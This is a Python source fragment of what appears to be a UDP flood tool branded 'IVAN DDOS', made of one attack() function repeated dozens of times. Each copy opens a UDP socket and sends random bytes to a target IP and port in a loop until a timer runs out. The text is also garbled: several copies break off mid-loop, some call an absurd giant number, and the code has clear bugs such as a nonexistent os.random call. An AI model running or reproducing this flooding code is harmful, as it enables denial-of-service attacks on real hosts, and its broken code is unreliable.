        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
    
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101655352101922110011655352211001199222111000111655352221110009992222111100001111655352222111100001111999922222111110000011111655352222211111000001111122222211111100000011111165535222222111111000000111111999999222222211111110000000111111165535222222211111110000000111111199999992222222211111111000000001111111165535222222221111111100000000111111119999999922222222211111111100000000011111111165535222222222111111111000000000999999999, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)
        
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS ★★★★")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
    
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
   
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(5, min(9999999999, port))
    if threads is not None:
        threads = max(5, min(9999999999, port))
    print(brand)
    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
    fmt = '\033[93m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    threads = os.urandom(min(2101, threads))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or os.random.randint(20000, 9999999999)
        threads = threads or os.random.randint(20000, 9999999999)
        time = time or os.random.randint(20000, 9999999999)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(threads, (ip, port))

    print('\033[93m Tamat')
    os.system("clear")
 
def attack(ip, port, time, threads):

    if time is None:
        time = float('inf')

    if port is not None:
